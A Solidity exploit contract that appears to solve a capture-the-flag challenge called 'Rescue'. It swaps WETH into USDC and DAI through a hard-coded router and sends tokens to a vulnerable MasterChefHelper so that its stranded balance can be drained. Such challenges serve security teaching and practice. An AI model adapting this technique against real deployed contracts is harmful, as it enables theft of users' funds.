pragma solidity 0.8.16;

import "./SetupRescue.sol";
import "../../lib/forge-std/src/interfaces/IERC20.sol";

contract Exploit {
    constructor(SetupRescue setup) payable {
        WETH9 weth = setup.weth();

        UniswapV2RouterLike router = UniswapV2RouterLike(
            0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F
        );
        MasterChefHelper mcHelper = setup.mcHelper();
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        weth.approve(address(router), type(uint256).max);

        weth.deposit{value: 80 ether}();

        address[] memory path = new address[](2);

        path[0] = address(weth);
        path[1] = usdc;

        router.swapExactTokensForTokens(
            20 ether,
            0,
            path,
            address(mcHelper),
            block.timestamp
        );

        path[1] = dai;

        router.swapExactTokensForTokens(
            2 ether,
            0,
            path,
            address(this),
            block.timestamp
        );
        ERC20Like(dai).approve(address(mcHelper), type(uint256).max);
        mcHelper.swapTokenForPoolToken(1, dai, 1 * 1e18, 0);
    }

    function getTokenSymbol(
        uint poolId
    ) external returns (string memory, string memory) {
        MasterChefLike masterchef = MasterChefLike(
            0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd
        );
        (address lpToken, , , ) = masterchef.poolInfo(poolId);
        address tokenOut0 = UniswapV2PairLike(lpToken).token0();
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();
        return (IERC20(tokenOut0).symbol(), IERC20(tokenOut1).symbol());
    }

    function getTokenAddress(uint poolId) external returns (address, address) {
        MasterChefLike masterchef = MasterChefLike(
            0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd
        );
        (address lpToken, , , ) = masterchef.poolInfo(poolId);
        address tokenOut0 = UniswapV2PairLike(lpToken).token0();
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();
        return (tokenOut0, tokenOut1);
    }
}
